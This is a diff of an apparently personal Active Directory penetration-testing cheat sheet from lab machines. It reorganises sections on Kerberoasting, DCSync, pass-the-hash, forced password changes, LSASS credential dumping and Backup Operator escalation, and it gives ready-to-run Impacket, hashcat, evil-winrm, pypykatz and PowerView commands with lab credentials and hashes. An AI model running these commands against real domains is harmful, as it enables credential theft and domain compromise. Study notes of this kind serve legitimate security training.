@@ -111,15 +111,33 @@ hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
 nxc smb [IP] --gen-relay-list relay.txt
 ```
 
-# Active Directory Exploitation
+# Domain Privilege Escalation
+## ASREPRoasting
 **[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**
 
+## Kerberoasting
+**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**
+
+**Requires:** Domain Credentials
+
+**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.
+
+```
+GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
+hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
+```
+
+## WriteDACL
 **[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**
 
+## Active Directory ACLs/ACEs
 **[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**
 
+## NTLMRelay
 **[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**
 
+## DCSync
 **[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**
 
 **With PowerView**:
@@ -133,27 +151,18 @@ Get-DomainUser -Identity svc-alfresco
 Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
 ```
 
+## SYSVOL Group Policy Credential Mining
 **[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**
-
-**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**
-
-**Requires:** Domain Credentials
-
-**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.
-
-```
-GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
-GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
-hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
-```
 
 **[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**
 
 **Additional Resources**
   - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)
 
-## Lateral Movement
-[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)
+# Lateral Movement
+
+## ForceChangePassword
+**[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)**
 
 **Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object
 
@@ -169,12 +178,14 @@ Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential
 **Additional Resources**
   - [BloodHound ForceChangePassword](https://support.bloodhoundenterprise.io/hc/en-us/articles/17223286750747-ForceChangePassword)
 
+## Pass The Hash
 **[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
 ```
 evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
   - Sometimes you can compromise the WinRM, and then create a new administrator account to psexec into to access domain.
 ```
 
+## SeDebugPrivilege Add New Administrative User
 **[SeDebugPrivilege Add New Administrative User](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)**
 
 ## Credential Dumping
@@ -196,7 +207,7 @@ Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-f
 pypykatz lsa minidump lsass.DMP
 ```
 
-## Domain Escalation
+## Backup Operator
 **[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**
 ```
 whoami /all (SeBackupPrivilege Enabled)
